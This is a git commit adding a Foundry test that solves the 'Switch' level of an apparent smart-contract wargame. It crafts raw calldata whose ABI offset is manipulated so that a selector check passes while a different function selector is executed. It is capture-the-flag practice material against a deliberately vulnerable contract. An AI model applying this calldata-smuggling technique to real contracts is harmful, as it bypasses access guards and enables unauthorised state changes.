3bf45f3564e3dede2752a028b6bbeb33c6da0722
capu <hi@capu.tech>
2023-09-21 13:08:21 -0300

    29-Switch. With this, I've completed them all!

--- test/29-Switch.t.sol
+++ test/29-Switch.t.sol
@@ -13,5 +13,29 @@ contract SwitchSolution is BaseTest {
 
     function solution(address payable target_) override internal {
       Switch target = Switch(target_);
+      bytes memory legalCallData = 
+        hex"30c13ade" 
+        hex"0000000000000000000000000000000000000000000000000000000000000020"
+        hex"0000000000000000000000000000000000000000000000000000000000000004"
+        hex"20606e1500000000000000000000000000000000000000000000000000000000";
+      (bool success, ) = address(target).call(
+        // function selector for flipSwitch()
+        hex"30c13ade" 
+        // this is the 'head' part for the argument tuple, containing an offset
+        // for where the content of the 'bytes _data' is stored
+        // even though the function is *known* to only have one parameter, the
+        // contract will eat this up and jump to where this heading points
+        hex"0000000000000000000000000000000000000000000000000000000000000060"
+        // this is just padding for the value the inline assembly reads. The
+        // length for the byte array should be here, but it's never read
+        hex"0000000000000000000000000000000000000000000000000000000000000000"
+        // this is what calldatacopy(selector, 68, 4) reads. 
+        hex"20606e1500000000000000000000000000000000000000000000000000000000"
+        // bytes 4-36 point here, where the length of the bytes array is stored
+        hex"0000000000000000000000000000000000000000000000000000000000000004"
+        // this'll end up in the `bytes memory _data`
+        hex"76227e1200000000000000000000000000000000000000000000000000000000"
+      );
+      require(success, "I borke it");
     }
 }
